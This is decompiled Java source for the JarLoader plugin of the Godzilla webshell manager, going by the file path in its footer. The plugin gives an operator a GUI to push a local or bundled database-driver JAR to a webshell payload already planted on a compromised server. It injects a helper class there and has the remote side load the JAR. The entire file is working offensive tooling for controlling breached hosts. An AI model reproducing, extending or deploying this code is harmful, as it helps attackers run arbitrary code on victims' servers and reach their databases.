/*     */ package shells.plugins.java;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.GBC;
/*     */ import core.ui.component.dialog.GFileChooser;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.GridBagLayout;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.File;
/*     */ import java.io.FileInputStream;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComboBox;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.filechooser.FileNameExtensionFilter;
/*     */ import util.Log;
/*     */ import util.UiFunction;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "JarLoader", DisplayName = "JarLoader")
/*     */ public class JarLoader
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "plugin.JarLoader";
/*  35 */   private static final String[] DB_JARS = new String[] { "mysql", "ojdbc5", "sqljdbc41" };
/*     */   
/*     */   private final JPanel panel;
/*     */   
/*     */   private final JComboBox<String> jarComboBox;
/*     */   
/*     */   private final JButton loadJarButton;
/*     */   private final JButton selectJarButton;
/*     */   private final JButton loadDbJarButton;
/*     */   private final JLabel jarFileLabel;
/*     */   private final JTextField jarTextField;
/*     */   private final JSplitPane meterpreterSplitPane;
/*     */   private boolean loadState;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public JarLoader() {
/*  53 */     this.panel = new JPanel(new BorderLayout());
/*     */     
/*  55 */     this.jarFileLabel = new JLabel("JarFile: ");
/*  56 */     this.loadJarButton = new JButton("LoadJar");
/*  57 */     this.loadDbJarButton = new JButton("LoadDbJar");
/*  58 */     this.selectJarButton = new JButton("select Jar");
/*  59 */     this.jarTextField = new JTextField(30);
/*  60 */     this.jarComboBox = new JComboBox<>(DB_JARS);
/*     */ 
/*     */     
/*  63 */     this.meterpreterSplitPane = new JSplitPane();
/*     */     
/*  65 */     this.meterpreterSplitPane.setOrientation(0);
/*  66 */     this.meterpreterSplitPane.setDividerSize(0);
/*     */     
/*  68 */     JPanel TopPanel = new JPanel();
/*  69 */     TopPanel.add(this.jarFileLabel);
/*  70 */     TopPanel.add(this.jarTextField);
/*  71 */     TopPanel.add(this.selectJarButton);
/*  72 */     TopPanel.add(this.loadJarButton);
/*     */     
/*  74 */     JPanel bottomPanel = new JPanel(new GridBagLayout());
/*     */     
/*  76 */     GBC gbcJarCommbox = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
/*  77 */     GBC gbcLoadDb = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
/*  78 */     bottomPanel.add(this.jarComboBox, gbcJarCommbox);
/*  79 */     bottomPanel.add(this.loadDbJarButton, gbcLoadDb);
/*     */     
/*  81 */     this.meterpreterSplitPane.setTopComponent(TopPanel);
/*  82 */     this.meterpreterSplitPane.setBottomComponent(bottomPanel);
/*     */     
/*  84 */     this.panel.add(this.meterpreterSplitPane);
/*     */   }
/*     */ 
/*     */   
/*     */   private void selectJarButtonClick(ActionEvent actionEvent) {
/*  89 */     GFileChooser chooser = new GFileChooser();
/*  90 */     chooser.setFileFilter(new FileNameExtensionFilter("*.jar", new String[] { "jar" }));
/*  91 */     chooser.setFileSelectionMode(0);
/*  92 */     boolean flag = (0 == chooser.showDialog(UiFunction.getParentFrame(this.panel), "选择"));
/*  93 */     File selectdFile = chooser.getSelectedFile();
/*  94 */     if (flag && selectdFile != null) {
/*  95 */       this.jarTextField.setText(selectdFile.getAbsolutePath());
/*     */     } else {
/*  97 */       Log.log("用户取消选择.....", new Object[0]);
/*     */     } 
/*     */   }
/*     */   
/*     */   private void loadJarButtonClick(ActionEvent actionEvent) {
/*     */     try {
/* 103 */       File jarFile = new File(this.jarTextField.getText());
/* 104 */       InputStream inputStream = new FileInputStream(jarFile);
/* 105 */       byte[] jarByteArray = functions.readInputStream(inputStream);
/* 106 */       inputStream.close();
/* 107 */       GOptionPane.showMessageDialog(this.panel, Boolean.valueOf(loadJar(jarByteArray)), "提示", 1);
/* 108 */     } catch (Exception e) {
/* 109 */       Log.error(e);
/* 110 */       GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */     } 
/*     */   }
/*     */   private void loadDbJarButtonClick(ActionEvent actionEvent) {
/*     */     try {
/* 115 */       InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.jar", new Object[] { this.jarComboBox.getSelectedItem() }));
/* 116 */       byte[] jarByteArray = functions.readInputStream(inputStream);
/* 117 */       inputStream.close();
/* 118 */       GOptionPane.showMessageDialog(this.panel, Boolean.valueOf(loadJar(jarByteArray)), "提示", 1);
/* 119 */     } catch (Exception e) {
/* 120 */       Log.error(e);
/* 121 */       GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */     } 
/*     */   }
/*     */   private void load() {
/* 125 */     if (!this.loadState) {
/*     */       try {
/* 127 */         InputStream inputStream = getClass().getResourceAsStream("assets/JarLoader.classs");
/* 128 */         byte[] data = functions.readInputStream(inputStream);
/* 129 */         inputStream.close();
/* 130 */         if (this.payload.include("plugin.JarLoader", data)) {
/* 131 */           this.loadState = true;
/* 132 */           Log.log("Load success", new Object[0]);
/*     */         } else {
/* 134 */           Log.log("Load fail", new Object[0]);
/*     */         } 
/* 136 */       } catch (Exception e) {
/* 137 */         Log.error(e);
/*     */       } 
/*     */     }
/*     */   }
/*     */   
/*     */   public boolean loadJar(byte[] jarByteArray) {
/*     */     try {
/* 144 */       load();
/* 145 */       ReqParameter parameter = new ReqParameter();
/* 146 */       parameter.add("jarByteArray", jarByteArray);
/* 147 */       String resultString = this.encoding.Decoding(this.payload.evalFunc("plugin.JarLoader", "loadJar", parameter));
/* 148 */       Log.log("loadJar:%s", new Object[] { resultString });
/* 149 */       if ("ok".equals(resultString)) {
/* 150 */         return true;
/*     */       }
/* 152 */     } catch (Exception e) {
/* 153 */       Log.error(e);
/*     */     } 
/* 155 */     return false;
/*     */   }
/*     */   public boolean hasClass(String className) {
/* 158 */     load();
/* 159 */     ReqParameter parameter = new ReqParameter();
/* 160 */     parameter.add("className", className);
/*     */     try {
/* 162 */       String resultString = this.encoding.Decoding(this.payload.evalFunc("plugin.JarLoader", "hasClass", parameter));
/*     */       
/* 164 */       return Boolean.parseBoolean(resultString);
/* 165 */     } catch (Exception e) {
/* 166 */       Log.error(e);
/* 167 */       return false;
/*     */     } 
/*     */   }
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 172 */     this.shellEntity = shellEntity;
/* 173 */     this.payload = this.shellEntity.getPayloadModule();
/* 174 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 175 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 183 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\JarLoader.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */